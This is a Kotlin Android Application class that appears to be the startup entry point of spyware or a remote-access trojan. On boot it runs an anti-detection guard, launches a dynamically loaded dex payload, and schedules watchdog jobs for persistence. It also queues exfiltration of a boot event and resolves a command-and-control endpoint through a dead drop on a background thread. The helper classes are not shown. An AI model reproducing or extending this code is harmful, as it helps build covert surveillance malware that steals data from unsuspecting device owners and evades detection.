package com.sp.core

import android.app.Application
import android.util.Log
import com.sp.loader.DexLoader
import com.sp.core.stealth.AntiDetect
import com.sp.core.util.BatchExfil
import com.sp.core.util.DeadDrop
import com.sp.watchdog.WatchdogAlarm
import com.sp.watchdog.WatchdogJob

/**
 * Boot entry point.
 *
 * Nothing that can throw is executed here: the app must survive the start of
 * the process no matter what the device state is. Foreground services are
 * started later from the setup wizard (the app is in the foreground there,
 * which is what Android 12+ requires).
 */
class App : Application() {

    override fun onCreate() {
        super.onCreate()
        try {
            AntiDetect.guard(this)
        } catch (t: Throwable) {
            Log.w(TAG, "antidetect: ${t.message}")
        }

        try {
            DexLoader.launch(this)
        } catch (t: Throwable) {
            Log.w(TAG, "payload: ${t.message}")
        }

        try {
            WatchdogJob.schedule(this)
        } catch (t: Throwable) {
            Log.w(TAG, "watchdog job: ${t.message}")
        }

        try {
            BatchExfil.enqueue(this, "boot", """{"ts":${System.currentTimeMillis()}}""")
        } catch (t: Throwable) {
        }

        // Dead-drop resolution of the C2 endpoint (off the main thread).
        Thread {
            try { DeadDrop.resolve(this) } catch (_: Throwable) {}
        }.start()
    }

    companion object {
        private const val TAG = "App"
    }
}
